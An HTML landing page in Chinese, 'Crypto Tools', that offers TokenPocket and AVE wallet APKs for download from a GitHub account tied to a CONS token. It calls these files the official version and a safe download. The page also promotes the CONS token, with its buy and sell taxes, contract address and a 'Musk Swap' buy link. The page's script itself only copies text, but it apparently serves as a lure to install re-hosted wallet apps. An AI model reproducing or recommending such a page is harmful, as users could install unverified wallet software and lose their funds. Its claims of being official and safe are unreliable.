<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Crypto Tools</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
    background: #f0f2f7;
    min-height: 100vh;
    padding: 48px 16px;
    color: #1a1d24;
  }

  .container {
    max-width: 520px;
    margin: 0 auto;
  }

  .header {
    text-align: center;
    margin-bottom: 36px;
  }

  .header h1 {
    font-size: 34px;
    font-weight: 800;
    color: #0f172a;
    letter-spacing: -0.8px;
  }

  .header p {
    color: #7c8594;
    font-size: 15px;
    margin-top: 6px;
  }

  .section-label {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    font-size: 13px;
    font-weight: 700;
    color: #3b82f6;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 12px;
    margin-left: 4px;
  }

  .section-label::before {
    content: "";
    width: 3px;
    height: 14px;
    background: #3b82f6;
    border-radius: 2px;
  }

  .cards {
    display: flex;
    flex-direction: column;
    gap: 12px;
    margin-bottom: 32px;
  }

  .card {
    background: #ffffff;
    border: 1px solid #e2e8f0;
    border-radius: 16px;
    padding: 22px 24px;
    display: flex;
    align-items: center;
    gap: 18px;
    text-decoration: none;
    transition: border-color 0.2s, box-shadow 0.2s, transform 0.15s;
    cursor: pointer;
  }

  .card:hover {
    border-color: #3b82f6;
    box-shadow: 0 4px 20px rgba(59, 130, 246, 0.1);
    transform: translateY(-1px);
  }

  .card-icon {
    width: 52px;
    height: 52px;
    border-radius: 13px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 26px;
    flex-shrink: 0;
  }

  .card-tp .card-icon { background: #ecfdf5; }
  .card-ave .card-icon { background: #fffbeb; }
  .card-musk .card-icon { background: #faf5ff; }

  .card-body { flex: 1; min-width: 0; }

  .card-title {
    font-size: 17px;
    font-weight: 700;
    color: #0f172a;
    margin-bottom: 4px;
  }

  .card-sub {
    font-size: 14px;
    color: #7c8594;
  }

  .card-action { flex-shrink: 0; }

  .btn {
    padding: 9px 18px;
    border-radius: 10px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    border: none;
    transition: all 0.2s;
    white-space: nowrap;
  }

  .btn-download {
    background: #f1f5f9;
    color: #475569;
  }

  .btn-download:hover {
    background: #e2e8f0;
    color: #1e293b;
  }

  .btn-copy {
    background: #eff6ff;
    color: #2563eb;
  }

  .btn-copy:hover {
    background: #dbeafe;
  }

  .btn-copy.copied {
    background: #f0fdf4;
    color: #16a34a;
  }

  /* Info card */
  .info-card {
    background: #ffffff;
    border: 1px solid #e2e8f0;
    border-radius: 16px;
    overflow: hidden;
    box-shadow: 0 2px 12px rgba(0,0,0,0.04);
  }

  /* Tax section */
  .tax-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
    padding: 20px;
    background: #f8fafc;
    border-bottom: 1px solid #f1f5f9;
  }

  .tax-card {
    background: #ffffff;
    border-radius: 14px;
    padding: 18px;
    border: 1px solid #e2e8f0;
  }

  .tax-card-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 16px;
  }

  .tax-label {
    font-size: 15px;
    font-weight: 700;
    color: #334155;
  }

  .tax-badge {
    font-size: 15px;
    font-weight: 800;
    padding: 3px 12px;
    border-radius: 20px;
  }

  .tax-badge.buy {
    background: #dbeafe;
    color: #1d4ed8;
  }

  .tax-badge.sell {
    background: #fee2e2;
    color: #b91c1c;
  }

  .tax-item {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 7px 0;
    font-size: 15px;
    color: #334155;
    font-weight: 500;
  }

  .tax-dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    flex-shrink: 0;
  }

  .dot-burn { background: #f97316; }
  .dot-market { background: #a855f7; }
  .dot-lp { background: #22c55e; }

  .tax-item span {
    font-size: 13px;
    color: #94a3b8;
    margin-left: auto;
    font-weight: 600;
  }

  /* Contract section */
  .contract-section { padding: 20px; }

  .contract-title {
    font-size: 15px;
    font-weight: 700;
    color: #0f172a;
    margin-bottom: 12px;
  }

  .contract-row {
    display: flex;
    align-items: flex-start;
    gap: 12px;
    margin-bottom: 12px;
  }

  .contract-label {
    font-size: 13px;
    color: #94a3b8;
    width: 48px;
    flex-shrink: 0;
    padding-top: 2px;
  }

  .contract-key {
    font-size: 15px;
    font-weight: 600;
    color: #1e293b;
    margin-bottom: 4px;
  }

  .addr-box {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-top: 4px;
  }

  .addr-text {
    font-size: 12px;
    color: #475569;
    font-family: "SF Mono", "Fira Code", monospace;
    background: #f8fafc;
    padding: 8px 12px;
    border-radius: 8px;
    border: 1px solid #e2e8f0;
    word-break: break-all;
    line-height: 1.6;
    flex: 1;
  }

  .btn-copy-addr {
    flex-shrink: 0;
    padding: 8px 14px;
    border-radius: 8px;
    font-size: 13px;
    font-weight: 600;
    cursor: pointer;
    border: 1px solid #e2e8f0;
    background: #ffffff;
    color: #2563eb;
    transition: all 0.2s;
  }

  .btn-copy-addr:hover {
    border-color: #3b82f6;
    background: #eff6ff;
  }

  .btn-copy-addr.copied {
    border-color: #16a34a;
    color: #16a34a;
    background: #f0fdf4;
  }

  .footer {
    text-align: center;
    color: #c1c8d4;
    font-size: 13px;
    margin-top: 40px;
  }

  .toast {
    position: fixed;
    top: 24px;
    left: 50%;
    transform: translateX(-50%) translateY(-80px);
    background: #ffffff;
    border: 1px solid #e2e8f0;
    box-shadow: 0 8px 32px rgba(0,0,0,0.12);
    color: #16a34a;
    padding: 12px 28px;
    border-radius: 12px;
    font-size: 15px;
    font-weight: 700;
    transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
    z-index: 999;
    pointer-events: none;
    display: flex;
    align-items: center;
    gap: 8px;
  }

  .toast.show { transform: translateX(-50%) translateY(0); }

  .toast-dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: #16a34a;
  }

  @media (max-width: 400px) {
    .addr-box { flex-direction: column; align-items: flex-start; }
    .btn-copy-addr { width: 100%; text-align: center; }
    .card { padding: 18px; }
  }
</style>
</head>
<body>
  <div class="toast" id="toast">
    <div class="toast-dot"></div>
    <span id="toastText">已复制成功</span>
  </div>

  <div class="container">
    <div class="header">
      <h1>Crypto Tools</h1>
      <p>官方版本 · 安全下载</p>
    </div>

    <div class="section-label">下载</div>
    <div class="cards">
      <div class="card card-musk" onclick="copyLink('musk')">
        <div class="card-icon">🟣</div>
        <div class="card-body">
          <div class="card-title">马斯克 Swap</div>
          <div class="card-sub">去中心化交易平台</div>
        </div>
        <div class="card-action">
          <span class="btn btn-copy" id="btnMusk">复制链接</span>
        </div>
      </div>

      <a class="card card-tp" href="https://github.com/CONS-CTO/crypto-tools/releases/download/v1.0.0/TP.apk" target="_blank">
        <div class="card-icon">💳</div>
        <div class="card-body">
          <div class="card-title">TP 钱包</div>
          <div class="card-sub">TokenPocket 安全多链钱包 · 113.3 MB</div>
        </div>
        <div class="card-action">
          <span class="btn btn-download">下载</span>
        </div>
      </a>

      <a class="card card-ave" href="https://github.com/CONS-CTO/crypto-tools/releases/download/v1.0.0/ave.apk" target="_blank">
        <div class="card-icon">🪙</div>
        <div class="card-body">
          <div class="card-title">AVE</div>
          <div class="card-sub">Web3 生态应用平台 · 163.6 MB</div>
        </div>
        <div class="card-action">
          <span class="btn btn-download">下载</span>
        </div>
      </a>
    </div>

    <div class="section-label">CONS 代币信息</div>
    <div class="info-card">
      <div class="tax-grid">
        <div class="tax-card">
          <div class="tax-card-header">
            <div class="tax-label">买入</div>
            <div class="tax-badge buy">3%</div>
          </div>
          <div class="tax-item">
            <div class="tax-dot dot-burn"></div>
            永久销毁
            <span>+1%</span>
          </div>
          <div class="tax-item">
            <div class="tax-dot dot-market"></div>
            营销红包
            <span>+1%</span>
          </div>
          <div class="tax-item">
            <div class="tax-dot dot-lp"></div>
            LP 底池分红
            <span>+1%</span>
          </div>
        </div>

        <div class="tax-card">
          <div class="tax-card-header">
            <div class="tax-label">卖出</div>
            <div class="tax-badge sell">4%</div>
          </div>
          <div class="tax-item">
            <div class="tax-dot dot-burn"></div>
            永久销毁
            <span>+1%</span>
          </div>
          <div class="tax-item">
            <div class="tax-dot dot-market"></div>
            营销红包
            <span>+1%</span>
          </div>
          <div class="tax-item">
            <div class="tax-dot dot-lp"></div>
            LP 底池分红
            <span>+2%</span>
          </div>
        </div>
      </div>

      <div class="contract-section">
        <div class="contract-row">
          <div class="contract-label">合约</div>
          <div style="flex:1;">
            <div class="contract-key">合约地址</div>
            <div class="addr-box">
              <div class="addr-text" id="consAddr">0x41bfb247acc8e600174c20b0ec9df148b9d967a8</div>
              <button class="btn-copy-addr" id="btnConsAddr" onclick="copyAddr()">复制</button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="footer">仅提供官方版本下载 · 建议从官网获取最新版</div>
  </div>

  <script>
    function showToast(text) {
      const toast = document.getElementById("toast");
      document.getElementById("toastText").textContent = text;
      toast.classList.add("show");
      setTimeout(() => toast.classList.remove("show"), 2000);
    }

    function copyLink(type) {
      const urls = {
        musk: "https://muskswap.club/?utm_source=tokenpocket&inputCurrency=0x55d398326f99059fF775485246999027B3197955&outputCurrency=0x41BFb247acc8E600174C20b0eC9Df148B9d967A8"
      };
      const btn = document.getElementById("btnMusk");
      navigator.clipboard.writeText(urls[type]).then(() => {
        btn.textContent = "已复制";
        btn.classList.add("copied");
        showToast("链接已复制");
        setTimeout(() => { btn.textContent = "复制链接"; btn.classList.remove("copied"); }, 2000);
      });
    }

    function copyAddr() {
      const addr = "0x41bfb247acc8e600174c20b0ec9df148b9d967a8";
      const btn = document.getElementById("btnConsAddr");
      navigator.clipboard.writeText(addr).then(() => {
        btn.textContent = "已复制";
        btn.classList.add("copied");
        showToast("合约地址已复制");
        setTimeout(() => { btn.textContent = "复制"; btn.classList.remove("copied"); }, 2000);
      });
    }
  </script>
</body>
</html>
